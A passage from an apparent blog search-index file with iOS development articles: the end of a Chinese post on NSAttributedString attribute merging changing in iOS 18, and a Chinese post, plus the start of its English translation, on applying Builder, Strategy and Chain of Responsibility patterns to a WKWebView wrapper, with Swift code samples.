mutableAttributedString 在執行以上操作時不會有問題；代表輸入的資料內容在 iOS 18 有所變動。NSAttributedString attributes: [NSAttributedString.Key: Any?]在深入挖掘問題之前先介紹一下 NSAttributedString attributes 的 合併機制 。NSAttributedString attributes 會 自動比較 .key 相同的相鄰 Range Attributes 物件是否相同，相同則合併成同個 Attribute 例如：let mutableAttributedString = NSMutableAttributedString(string: \"\", attributes: nil)mutableAttributedString.append(NSAttributedString(string: \"&lt;div&gt;\", attributes: [.font: UIFont.systemFont(ofSize: 14)]))mutableAttributedString.append(NSAttributedString(string: \"&lt;div&gt;\", attributes: [.font: UIFont.systemFont(ofSize: 14)]))mutableAttributedString.append(NSAttributedString(string: \"&lt;p&gt;\", attributes: [.font: UIFont.systemFont(ofSize: 14)]))mutableAttributedString.append(NSAttributedString(string: \"Test\", attributes: [.font: UIFont.systemFont(ofSize: 12)]))最終 Attributes 合併結果：&lt;div&gt;&lt;div&gt;&lt;p&gt;{ NSFont = \"&lt;UICTFont: 0x101d13400&gt; font-family: \\\".SFUI-Regular\\\"; font-weight: normal; font-style: normal; font-size: 14.00pt\";}Test{ NSFont = \"&lt;UICTFont: 0x101d13860&gt; font-family: \\\".SFUI-Regular\\\"; font-weight: normal; font-style: normal; font-size: 12.00pt\";}在 enumerateAttribute(.breaklinePlaceholder...) 時會得到以下結果:NSRange {0, 13}: &lt;UICTFont: 0x101d13400&gt; font-family: \".SFUI-Regular\"; font-weight: normal; font-style: normal; font-size: 14.00ptNSRange {13, 4}: &lt;UICTFont: 0x101d13860&gt; font-family: \".SFUI-Regular\"; font-weight: normal; font-style: normal; font-size: 12.00ptNSAttributedString attributes 合併 — 底層實踐方式推測推測底層是使用 Set&lt;Hashable&gt; 做為 Attributes 容器，會自動排除相同的 Attriubte 物件。但是為了使用方便， NSAttributedString attributes: [NSAttributedString.Key: Any?] Value 物件是宣告成 Any? Type，沒有限制 Hashable。也因此推測系統在底層會在 Conform as? Hashable 然後使用 Set 合併管理物件。 這次的 iOS ≥ 18 調整差異推測就是這邊底層的實現問題。以下是以我們自訂的 .breaklinePlaceholder Attributes 為例:struct BreaklinePlaceholder: Equatable { let rawValue: Int static let tagBoundaryPrefix = BreaklinePlaceholder(rawValue: 1) static let tagBoundarySuffix = BreaklinePlaceholder(rawValue: 2) static let breaklineTag = BreaklinePlaceholder(rawValue: 3)}extension NSAttributedString.Key { static let breaklinePlaceholder: NSAttributedString.Key = .init(\"breaklinePlaceholder\")}//let mutableAttributedString = NSMutableAttributedString(string: \"\", attributes: nil)mutableAttributedString.append(NSAttributedString(string: \"&lt;div&gt;\", attributes: [.breaklinePlaceholder: NSAttributedString.Key.BreaklinePlaceholder.tagBoundaryPrefix]))mutableAttributedString.append(NSAttributedString(string: \"&lt;div&gt;\", attributes: [.breaklinePlaceholder: NSAttributedString.Key.BreaklinePlaceholder.tagBoundaryPrefix]))mutableAttributedString.append(NSAttributedString(string: \"&lt;p&gt;\", attributes: [.breaklinePlaceholder: NSAttributedString.Key.BreaklinePlaceholder.tagBoundaryPrefix]))mutableAttributedString.append(NSAttributedString(string: \"Test\", attributes: nil))iOS ≤ 17 前會得到以下 Attributes 合併結果：&lt;div&gt;{ breaklinePlaceholder = \"NSAttributedStringCrash.BreaklinePlaceholder(rawValue: 1)\";}&lt;div&gt;{ breaklinePlaceholder = \"NSAttributedStringCrash.BreaklinePlaceholder(rawValue: 1)\";}&lt;p&gt;{ breaklinePlaceholder = \"NSAttributedStringCrash.BreaklinePlaceholder(rawValue: 1)\";}Test{}iOS ≥ 18 會得到以下 Attributes 合併結果：&lt;div&gt;&lt;div&gt;&lt;p&gt;{ breaklinePlaceholder = \"NSAttributedStringCrash.BreaklinePlaceholder(rawValue: 1)\";}Test{} 可以看到同樣的程式在不同版本的 iOS 有不同的結果，這最終導致了後續的 enumerateAttribute(.breaklinePlaceholder..) 中的處理邏輯不合預期造成閃退。⭐️ iOS ≥ 18 NSAttributedString attributes: [NSAttributedString.Key: Any?] 會多參考 Equatable ==⭐️比較 iOS 17/18 有無實現 Equatable/Hashable 的結果 ⭐️⭐️ iOS ≥ 18 會多參考 Equatable ，iOS ≤ 17 則不會。⭐️⭐️結合前述， NSAttributedString attributes: [NSAttributedString.Key: Any?] Value 物件是宣告成 Any? Type， 就觀測結果， iOS ≥ 18 會先參考 Equatable 判斷是否相同，然後再使用 Hashable Set 合併管理物件。結論 NSAttributedString attributes: [NSAttributedString.Key: Any?] 在合併 Range Attribute 時，iOS ≥ 18 會多參考 Equatable，這點與以往不同。另外在 iOS 18 開始如果只宣告 Equatable XCode Console 也會輸出 Warning: Obj-C ` -hash` invoked on a Swift value of type `BreaklinePlaceholder` that is Equatable but not Hashable; this can lead to severe performance problems.有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 263 Total Views Last Statistics Date: 2025-08-15 | 251 Views on Medium." }, { "title": "Design Patterns 的實戰應用紀錄—In WKWebView with Builder, Strategy & Chain of Responsibility Pattern", "url": "/posts/kkday-tech-blog/design-patterns-%E7%9A%84%E5%AF%A6%E6%88%B0%E6%87%89%E7%94%A8%E7%B4%80%E9%8C%84-in-wkwebview-with-builder-strategy-chain-of-responsibility-pattern-f4b02ee342a4/", "categories": "KKday Tech Blog", "tags": "ios-app-development, design-patterns, chain-of-responsibility, builder-pattern, strategy-pattern", "date": "2024-09-06 13:47:47 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Design Patterns 的實戰應用紀錄—In WKWebView with Builder, Strategy &amp; Chain of Responsibility Pattern封裝 iOS WKWebView...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Design Patterns 的實戰應用紀錄—In WKWebView with Builder, Strategy &amp; Chain of Responsibility Pattern封裝 iOS WKWebView 時使用到的 Design Patterns 場景 (策略、責任鏈、建造模式)。Photo by Dean PughAbout Design Patterns每次講 Design Patterns 之前都要提一下，最經典的 GoF 23 種設計模式發表至今已過去 30 年 (1994 年發行)，工具、語言的變化、軟體開發模式的變遷已經不可同日而語，後續在不同領域也延伸出許多新的設計模式；Design Patterns 並不是萬能解、也不是唯一解，他的存在更像是一種「語言代稱」在適合的場景套用適合的設計模式，可以減少開發協作的障礙，例如：這邊套用策略模式，後續維護擴充的人，就可以直接依照策略模式的架構進行迭代，並且設計模式多半都解耦的不錯，對於擴充性、測試性也有顯著的幫助。Design Patterns 的使用心法 不是唯一解 不是萬能解 不能硬套，需按照要解決問題的類型(創建？行為？結構？)、目的選擇對應的設計模式 不能魔改，魔改容易造成後續維護的人誤會，跟語言一樣大家都用蘋果都叫 Apple，如果自己定義叫 Banana 就會變成是一個需要特別知道的開發成本 盡可能避開關鍵字，例如 Factory Pattern 習慣命名為 XXXFactory ，那如果不是工廠模式就不該使用此命名關鍵字 謹慎自己創造模式 ，同前述雖然經典的只有 23 種，但經歷各個領域多年的演化也有很多新的模式，可以先參考網路資料找到適合的模式(畢竟三個臭皮匠勝過一個諸葛亮)，真的沒有再來提出新的設計模式並盡可能發表讓不同領域、不同場境的人一起檢視跟調整 程式終究是寫給人維護的，只要好維護、好擴充，不一定要使用設計模式 團隊要有 Design Patterns 的共識才適合使用 Design Pattern 可以再套 Design Pattern 組合技 Design Patterns 上手要經過實務不斷地淬鍊，才會越來越有什麼場景適合或不適合套用的敏銳度輔助神器 ChatGPT自從有了 ChatGPT 學習 Design Patterns 設計模式的實務應用就更容易，只要把你的問題具體的描述給他，問他有哪些設計模式適合這個場景，他都能給出幾個可能適合的模式並且附上說明；雖然不是每個答案都那麼適合，但他至少給出了幾個可行方向，我們只要再深入這幾個模式結合自己實務場景的問題，最後都能選到不錯的解法！WKWebView 的 Design Patterns 實戰應用場景這次的 Design Patterns 實戰應用是在收斂目前 Codebase 中的 WKWebView 物件功能特性，並開發統一的 WKWebView 元件時在幾個合適的邏輯抽象點套用 Design Patterns 的心得紀錄分享。 完整 Demo 專案程式碼會附在文末。原始無抽象的寫法class WKWebViewController: UIViewController { // MARK - 定義一些變數、開關 讓外部 init 時注入特性... // 模擬商業邏輯：開關 Match 特殊路徑開原生頁面 let noNeedNativePresent: Bool // 模擬商業邏輯：開關 DeeplinkManager 檢查 let deeplinkCheck: Bool // 模擬商業邏輯：是開首頁嗎？ let isHomePage: Bool // 模擬商業邏輯：要注入到 WKWebView 的 WKUserScript 的腳本 let userScripts: [WKUserScript] // 模擬商業邏輯：要注入到 WKWebView 的 WKScriptMessageHandler 的腳本 let scriptMessageHandlers: [String: WKScriptMessageHandler] // 是否允許從 WebView 取得 Title 複寫 ViewController Title let overrideTitleFromWebView: Bool let url: URL // ... }// ...extension OldWKWebViewController: WKNavigationDelegate { // MARK - iOS WKWebView 的 navigationAction Delegate，用於讓我們決定即將載入的連結要怎麼處理 // 結束務必呼叫 decisionHandler(.allow) or decisionHandler(.cancel) // decisionHandler(.cancel) 將中斷載入即將載入的頁面 // 這邊模擬了不同的變數、開關會有不同的邏輯處理： func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { guard let url = navigationAction.request.url else { decisionHandler(.allow) return } // 模擬商業邏輯：WebViewController deeplinkCheck == true (代表需要過 DeepLinkManager 檢查並開啟頁面) if deeplinkCheck { print(\"DeepLinkManager.open(\\(url.absoluteString)\") // 模擬 DeepLinkManager 邏輯，URL 能成功打開則打開並結束流程。 // if DeepLinkManager.open(url) == true { decisionHandler(.cancel) return // } } // 模擬商業邏輯：WebViewController isHomePage == true (代表是開主頁) &amp; WebView 正在瀏覽首頁，則切換 TabBar Index if isHomePage { if url.absoluteString == \"https://zhgchg.li\" { print(\"Switch UITabBarController to Index 0\") decisionHandler(.cancel) } } // 模擬商業邏輯：WebViewController noNeedNativePresent == false (代表需要 Match 特殊路徑開原生頁面) if !noNeedNativePresent { if url.pathComponents.count &gt;= 3 { if url.pathComponents[1] == \"product\" { // match http://zhgchg.li/product/1234 let id = url.pathComponents[2] print(\"Present ProductViewController(\\(id)\") decisionHandler(.cancel) } else if url.pathComponents[1] == \"shop\" { // match http://zhgchg.li/shop/1234 let id = url.pathComponents[2] print(\"Present ShopViewController(\\(id)\") decisionHandler(.cancel) } // more... } } decisionHandler(.allow) }}// ...問題 設定變數、開關攤在 Class 當中，不清楚哪些是設定使用 直接暴露 WKUserScript 變數設定給外部，我們希望能管控注入的 JS，只允許注入特定行為 無法控制 WKScriptMessageHandler 的註冊規則 如果要 init 差不多的 WebView 需要重複寫注入參數的規則，參數規則無法復用 navigationAction Delegate 內部靠變數控制流程，如果要刪改流程或順序都要動到整個 Code，也可能改壞本來就正常的流程Builder Pattern 建造者模式 Builder Pattern（建造者模式） 屬於 創建型 設計模式，將創建物件的步驟與邏輯分離，操作者可一步一步設定參數並且復用設定，並在最後創建出目標物件，另外同樣的創建步驟也可以創建出不同的對象實現。上圖以製作 Pizza 為例，先將 Pizza 製作的步驟拆成好幾個方法，並宣告在 PizzaBuilder 這個 Protocol (Interface)， ConcretePizzaBuilder 為實際製作 Pizza 的物件，可能為 素食 PizzaBuilder &amp; 葷食 PizzaBuilder ；不同的 Builder 原料可能不一樣，但最終都會 build() 產出 Pizza 物件。WKWebView 場景回到 WKWebView 場景，我們的最終產出物件是 MyWKWebViewConfiguration ，我們把所有 WKWebView 會需要設定的變數全統一放到這個物件當中，並使用 Builder Pattern MyWKWebViewConfigurator 逐步完成 Configuration 的構建工作。public struct MyWKWebViewConfiguration { let headNavigationHandler: NavigationActionHandler? let scriptMessageStrategies: [ScriptMessageStrategy] let userScripts: [WKUserScript] let overrideTitleFromWebView: Bool let url: URL}// 全部參數都只對 Module 內暴露 (Internal)MyWKWebViewConfigurator (Builder Pattern) 這邊因為我只有 Build for MyWKWebView 的需求，因此沒有再把 MyWKWebViewConfigurator 多拆 Protocol(Interface)。public final class MyWKWebViewConfigurator { private var headNavigationHandler: NavigationActionHandler? = nil private var overrideTitleFromWebView: Bool = true private var disableZoom: Bool = false private var scriptMessageStrategies: [ScriptMessageStrategy] = [] public init() { } // 參數封裝、內控 public func set(disableZoom: Bool) -&gt; Self { self.disableZoom = disableZoom return self } public func set(overrideTitleFromWebView: Bool) -&gt; Self { self.overrideTitleFromWebView = overrideTitleFromWebView return self } public func set(headNavigationHandler: NavigationActionHandler) -&gt; Self { self.headNavigationHandler = headNavigationHandler return self } // 可以把新增邏輯規則封裝在裡面 public func add(scriptMessageStrategy: ScriptMessageStrategy) -&gt; Self { scriptMessageStrategies.removeAll(where: { type(of: $0).identifier == type(of: scriptMessageStrategy).identifier }) scriptMessageStrategies.append(scriptMessageStrategy) return self } public func build(url: URL) -&gt; MyWKWebViewConfiguration { var userScripts:[WKUserScript] = [] // 產生時才附加 if disableZoom { let script = \"var meta = document.createElement('meta'); meta.name='viewport'; meta.content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'; document.getElementsByTagName('head')[0].appendChild(meta);\" let disableZoomScript = WKUserScript(source: script, injectionTime: .atDocumentEnd, forMainFrameOnly: true) userScripts.append(disableZoomScript) } return MyWKWebViewConfiguration(headNavigationHandler: headNavigationHandler, scriptMessageStrategies: scriptMessageStrategies, userScripts: userScripts, overrideTitleFromWebView: overrideTitleFromWebView, url: url) }}多拆了一層也可以更好的使用 Access Control 隔離參數的使用權限，以本場景為例就是我們希望依然可以直接注入 WKUserScript 到 MyWKWebView 當中，但我們又不希望把開口開的這麼大讓使用的人可以隨意注入，因此結合 Builder Pattern + Swift Access Control，當 MyWKWebView 已經被放 Module 中後 MyWKWebViewConfigurator 對外封裝成操作方法 func set(disableZoom: Bool) ，對內在產生 MyWKWebViewConfiguration 時再附加上 WKUserScript ， MyWKWebViewConfiguration 所有參數對外都是不可更改並且只能透過 MyWKWebViewConfigurator 產生。MyWKWebViewConfigurator + Simple Factory 簡單工廠當有了 MyWKWebViewConfigurator Builder 之後我們可以再建立一個簡單工廠封裝、復用建立步驟。struct MyWKWebViewConfiguratorFactory { enum ForType { case `default` case productPage case payment } static func make(for type: ForType) -&gt; MyWKWebViewConfigurator { switch type { case .default: return MyWKWebViewConfigurator() .add(scriptMessageStrategy: PageScriptMessageStrategy()) .set(overrideTitleFromWebView: false) .set(disableZoom: false) case .productPage: return Self.make(for: .default).set(disableZoom: true).set(overrideTitleFromWebView: true) case .payment: return MyWKWebViewConfigurator().set(headNavigationHandler: paymentNavigationActionHandler) } }}Chain of Responsibility Pattern 責任鏈模式 責任鏈模式（Chain of Responsibility Pattern）屬於 行為型 設計模式，它將對象處理的操作封裝並使用鏈式結構串聯起來，請求操作會沿著鏈條傳遞，直到有被處理為止；串聯的操作封裝可以自由彈性的組合、更改順序。 責任鏈專注在東西進來你有沒有要處理，沒有就 Skip ，因此不能處理一半或是修改了輸入物件然後丟給下一個；如果是這種需求那是另一個 Interceptor Pattern 。上圖是以 Tech Support (or OnCall. . ) 為例，問題物件進來之後會先經過 CustomerService 如果他不能處理就往下一層 Supervisor 丟，如果還是不能處理再繼續往下到 TechSupport ；另外也可以針對不同問題組成不同的責任鏈，例如如果是大客戶的問題會直接從 Supervisor 開始處理；在 Swift UIKit 的 Responder Chain 也是使用了責任鏈模式，回應使用者在 UI 上的操作。WKWebView 場景在我們 WKWebView 的場景中，主要是套用在 func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) 這個 Delegate 方法。 當系統收到網址請求時會經過這個方法讓我們決定是否要允許跳轉，並在結束處理後呼叫 decisionHandler(.allow) or decisionHandler(.cancel) 告知結果。在 WKWebView 的實作上就會出現很多判斷或是有的頁面處理跟別人不一樣要繞開：// 原始寫法...func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { guard let url = navigationAction.request.url else { decisionHandler(.allow) return } // 模擬商業邏輯：WebViewController deeplinkCheck == true (代表需要過 DeepLinkManager 檢查並開啟頁面) if deeplinkCheck { print(\"DeepLinkManager.open(\\(url.absoluteString)\") // 模擬 DeepLinkManager 邏輯，URL 能成功打開則打開並結束流程。 // if DeepLinkManager.open(url) == true { decisionHandler(.cancel) return // } } // 模擬商業邏輯：WebViewController isHomePage == true (代表是開主頁) &amp; WebView 正在瀏覽首頁，則切換 TabBar Index if isHomePage { if url.absoluteString == \"https://zhgchg.li\" { print(\"Switch UITabBarController to Index 0\") decisionHandler(.cancel) } } // 模擬商業邏輯：WebViewController noNeedNativePresent == false (代表需要 Match 特殊路徑開原生頁面) if !noNeedNativePresent { if url.pathComponents.count &gt;= 3 { if url.pathComponents[1] == \"product\" { // match http://zhgchg.li/product/1234 let id = url.pathComponents[2] print(\"Present ProductViewController(\\(id)\") decisionHandler(.cancel) } else if url.pathComponents[1] == \"shop\" { // match http://zhgchg.li/shop/1234 let id = url.pathComponents[2] print(\"Present ShopViewController(\\(id)\") decisionHandler(.cancel) } // more... } } // more... decisionHandler(.allow)}隨著時間推移功能越來越複雜，這邊的邏輯也會越來越多，如果又扯到處理順序也要不一樣就會變成一場災難。NavigationActionHandler (Chain of Responsibility Pattern)先定義好 Handler Protocol：public protocol NavigationActionHandler: AnyObject { var nextHandler: NavigationActionHandler? { get set } /// Handles navigation actions for the web view. Returns true if the action was handled, otherwise false. func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool /// Executes the navigation action policy decision. If the current handler does not handle it, the next handler in the chain will be executed. func exeute(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void)}public extension NavigationActionHandler { func exeute(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { if !handle(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) { self.nextHandler?.exeute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) ?? decisionHandler(.allow) } }} 操作會在 func handle() 實現，如果有接下來處理則回傳 true 否則回傳 false func exeute() 是預設的鏈訪問實現，會從這邊執行遍歷整個操作鏈，預設行為是當 func handle() 為 false (代表此節點無法處理) 則自動呼叫下一個 nextHandler 的 execute() 繼續處理，直到結束。實現：// 預設實現，通常放到最後public final class DefaultNavigationActionHandler: NavigationActionHandler { public var nextHandler: NavigationActionHandler? public init() { } public func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool { decisionHandler(.allow) return true }}//final class PaymentNavigationActionHandler: NavigationActionHandler { var nextHandler: NavigationActionHandler? func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool { guard let url = navigationAction.request.url else { return false } // 模擬商業邏輯：Payment 付款相關、兩階段驗證 WebView...etc print(\"Present Payment Verify View Controller\") decisionHandler(.cancel) return true }}//final class DeeplinkManagerNavigationActionHandler: NavigationActionHandler { var nextHandler: NavigationActionHandler? func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool { guard let url = navigationAction.request.url else { return false } // 模擬 DeepLinkManager 邏輯，URL 能成功打開則打開並結束流程。 // if DeepLinkManager.open(url) == true { decisionHandler(.cancel) return true // } else { return false // }}// More...使用：extension MyWKWebViewController: WKNavigationDelegate { public func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { let headNavigationActionHandler = DeeplinkManagerNavigationActionHandler() let defaultNavigationActionHandler = DefaultNavigationActionHandler() let paymentNavigationActionHandler = PaymentNavigationActionHandler() headNavigationActionHandler.nextHandler = paymentNavigationActionHandler paymentNavigationActionHandler.nextHandler = defaultNavigationActionHandler headNavigationActionHandler.exeute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) }}這樣當請求收到後，就會照著我們定義的處理鏈依序處理。結合前面的 Builder Pattern MyWKWebViewConfigurator 將 headNavigationActionHandler 開成參數出去，就能從外部決定這個 WKWebView 的處理需求、順序：extension MyWKWebViewController: WKNavigationDelegate { public func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { configuration.headNavigationHandler?.exeute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) ?? decisionHandler(.allow) }}//...struct MyWKWebViewConfiguratorFactory { enum ForType { case `default` case productPage case payment } static func make(for type: ForType) -&gt; MyWKWebViewConfigurator { switch type { case .default: // 模擬預設情況有這些 handler let deplinkManagerNavigationActionHandler = DeeplinkManagerNavigationActionHandler() let homePageTabSwitchNavigationActionHandler = HomePageTabSwitchNavigationActionHandler() let nativeViewControllerNavigationActionHandlera = NativeViewControllerNavigationActionHandler() let defaultNavigationActionHandler = DefaultNavigationActionHandler() deplinkManagerNavigationActionHandler.nextHandler = homePageTabSwitchNavigationActionHandler homePageTabSwitchNavigationActionHandler.nextHandler = nativeViewControllerNavigationActionHandlera nativeViewControllerNavigationActionHandlera.nextHandler = defaultNavigationActionHandler return MyWKWebViewConfigurator() .add(scriptMessageStrategy: PageScriptMessageStrategy()) .add(scriptMessageStrategy: UserScriptMessageStrategy()) .set(headNavigationHandler: deplinkManagerNavigationActionHandler) .set(overrideTitleFromWebView: false) .set(disableZoom: false) case .productPage: return Self.make(for: .default).set(disableZoom: true).set(overrideTitleFromWebView: true) case .payment: // 模擬付款頁面只需要這些 handler，並且 paymentNavigationActionHandler 優先權最高 let paymentNavigationActionHandler = PaymentNavigationActionHandler() let deplinkManagerNavigationActionHandler = DeeplinkManagerNavigationActionHandler() let defaultNavigationActionHandler = DefaultNavigationActionHandler() paymentNavigationActionHandler.nextHandler = deplinkManagerNavigationActionHandler deplinkManagerNavigationActionHandler.nextHandler = defaultNavigationActionHandler return MyWKWebViewConfigurator().set(headNavigationHandler: paymentNavigationActionHandler) } }}Strategy Pattern 策略模式 策略模式（Strategy Pattern）屬於 行為型 設計模式，它將實際操作抽象出來，我們可以實現多種不同的操作，讓外部可以根據不同場境彈性的替換使用。上圖以不同支付方式為例，我們把支付抽象為 Payment Protocol (Interface)，然後各種支付方式去實現自己的實作，在 PaymentContext (模擬外部使用)時 依據使用者選擇的付款方式，產生對應的 Payment 實體並統一呼叫 pay() 進行支付。WKWebView 場景 在 WebView 與 前端頁面的交互中使用。 當前端 JavaScript 呼叫： window.webkit.messageHandlers.Name.postMessage(Parameters); 就會進到 WKWebView 找到對應 Name 的 WKScriptMessageHandler Class 進入執行操作。系統已經有定義好的 Protocol 跟相應的 func add(_ scriptMessageHandler: any WKScriptMessageHandler, name: String) 方法，我們只需要定義好自己的 WKScriptMessageHandler 實現，並加入到 WKWebView，系統就會依照 Strategy Pattern 策略模式，根據收到的 name 派發給對應的 具體策略 執行。這邊只做簡單的 Protocol extend WKScriptMessageHandler ，多一個 identifier:String for add(.. name:) 使用：public protocol ScriptMessageStrategy: NSObject, WKScriptMessageHandler { static var identifier: String { get }}實現：final class PageScriptMessageStrategy: NSObject, ScriptMessageStrategy { static var identifier: String = \"page\" func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) { // 模擬 called from js: window.webkit.messageHandlers.page.postMessage(\"Close\"); print(\"\\(Self.identifier): \\(message.body)\") }}//final class UserScriptMessageStrategy: NSObject, ScriptMessageStrategy { static var identifier: String = \"user\" func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) { // 模擬 called from js: window.webkit.messageHandlers.user.postMessage(\"Hello\"); print(\"\\(Self.identifier): \\(message.body)\") }}WKWebView 註冊使用：var scriptMessageStrategies: [ScriptMessageStrategy] = []scriptMessageStrategies.forEach { scriptMessageStrategy in webView.configuration.userContentController.add(scriptMessageStrategy, name: type(of: scriptMessageStrategy).identifier)}結合前面的 Builder Pattern MyWKWebViewConfigurator 從外部管理 ScriptMessageStrategy 的註冊：public final class MyWKWebViewConfigurator { //... // 可以把新增邏輯規則封裝在裡面 public func add(scriptMessageStrategy: ScriptMessageStrategy) -&gt; Self { // 這邊只有實現重複 identifier 時會先刪除舊的的邏輯 scriptMessageStrategies.removeAll(where: { type(of: $0).identifier == type(of: scriptMessageStrategy).identifier }) scriptMessageStrategies.append(scriptMessageStrategy) return self } //...}//...public class MyWKWebViewController: UIViewController { //... public override func viewDidLoad() { super.viewDidLoad() //... configuration.scriptMessageStrategies.forEach { scriptMessageStrategy in webView.configuration.userContentController.add(scriptMessageStrategy, name: type(of: scriptMessageStrategy).identifier) } //... }}Question: 這個場景也可以改用 Chain of Responsibility Pattern 責任鏈模式嗎？到這邊有朋友可能會想問，那這邊的 Strategy Pattern 可以用 Chain of Responsibility Pattern 取代嗎？ 這兩個設計模式同樣是行為型，可以取代；但實際要看需求場景，在這邊是很典型的 Strategy Pattern，WKWebView 依照 Name 去決定要進入的不同 Strategy；如果我們的需求是不同的 Strategy 之間可能有鏈式依賴或是 recover 關係，例如 AStrategy 如果不做要丟給 BStrategy 做，這時候才會考慮使用 Chain of Responsibility Pattern。Strategy v.s. Chain of Responsibility Strategy Pattern：已有明確派發執行策略且策略與策略之間沒有關係。 Chain of Responsibility Pattern：執行策略是在個別實現中決定，如果無法處理則往下丟給下一個實現。複雜場景可以用 Strategy Pattern 裡面再套用 Chain of Responsibility Pattern 組合達成。最終組合 Simple Factory 簡單工廠模式 MyWKWebViewConfiguratorFactory -&gt; 封裝 MyWKWebViewConfigurator 產生步驟 Builder Pattern 建造者模式 MyWKWebViewConfigurator -&gt; 封裝 MyWKWebViewConfiguration 參數、構建步驟 MyWKWebViewConfiguration 注入 -&gt; 給 MyWKWebViewController 使用 Chain of Responsibility Pattern 責任鏈模式 MyWKWebViewController 的 func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; 呼叫 headNavigationHandler?.exeute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) 鏈執行處理 Strategy Pattern 策略模式 MyWKWebViewController 的 webView.configuration.userContentController.addUserScript(XXX) 派發對應的 JS Caller 到對應處理的策略中完整 Demo Repo延伸閱讀 Design Patterns 的實戰應用紀錄 Visitor Pattern in Swift (Share Object to XXX Example) Visitor Pattern in TableView有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 487 Total Views Last Statistics Date: 2025-08-15 | 429 Views on Medium." }, { "title": "Practical Application of Design Patterns—In WKWebView with Builder, Strategy & Chain of Responsibility Pattern", "url": "/posts/kkday-tech-blog/en/practical-application-of-design-patterns-in-wkwebview-with-builder-strategy-chain-of-responsibility-pattern-f4b02ee342a4/", "categories": "KKday Tech Blog", "tags": "ios-app-development, design-patterns, chain-of-responsibility, builder-pattern, strategy-pattern", "date": "2024-09-06 13:47:47 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Practical Application of Design Patterns—In WKWebView with Builder, Strategy &amp; C...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Practical Application of Design Patterns—In WKWebView with Builder, Strategy &amp; Chain of Responsibility PatternThis article discusses the scenarios of Design Patterns used when encapsulating iOS WKWebView (Strategy, Chain of Responsibility, Builder Pattern).Photo by Dean PughAbout Design PatternsBefore discussing Design Patterns, it’s important to note that the classic 23 design patterns from the Gang of Four (GoF) were published over 30 years ago (in 1994). The evolution of tools, languages, and software development methodologies has changed significantly since then, leading to the emergence of many new design patterns in various fields. Design Patterns are not a one-size-fits-all solution; rather, they serve as a “language shorthand” that can be applied appropriately in suitable scenarios to reduce collaboration barriers in development. For example, by applying the Strategy Pattern here, future maintainers can iterate based on the structure of the Strategy Pattern. Moreover, design patterns are generally well-decoupled, which significantly aids in extensibility and testability.Principles for Using Design Patterns They are not the only solution. They are not a universal solution. They should not be rigidly applied; choose the appropriate design pattern based on the type of problem to be solved (creation? behavior? structure?) and the intended purpose. Avoid “magic modifications”; such changes can lead to misunderstandings for future maintainers. Just as everyone refers to Apple as “Apple,” if you define it as “Banana,” it becomes a development cost that requires special knowledge. Try to avoid using keywords; for example, if the Factory Pattern is commonly named XXXFactory, then it should not be used if it is not a factory pattern. Be cautious when creating your own patterns. Although there are only 23 classic patterns, many new patterns have evolved over the years across various fields. It’s advisable to refer to online resources to find suitable patterns (after all, three cobblers are better than one Zhuge Liang). If there are truly no existing patterns, propose new design patterns and try to publish them for review and adjustment by people from different fields and contexts. Code is ultimately written for people to maintain; as long as it is maintainable and extensible, it does not necessarily have to use design patterns. Teams should have a consensus on Design Patterns before using them. Design Patterns can be combined with other Design Patterns. Mastering Design Patterns requires practical experience and continuous refinement to develop sensitivity to which scenarios are suitable or unsuitable for application.Support Tool: ChatGPTSince the advent of ChatGPT, learning about the practical applications of Design Patterns has become much easier. By clearly describing your questions, you can ask it which design patterns are suitable for a given scenario, and it can provide several possible patterns along with explanations. While not every answer may be perfectly suitable, it at least offers several viable directions. We can then delve deeper into these patterns, combining them with our practical scenario issues to ultimately arrive at good solutions!Practical Application Scenarios of Design 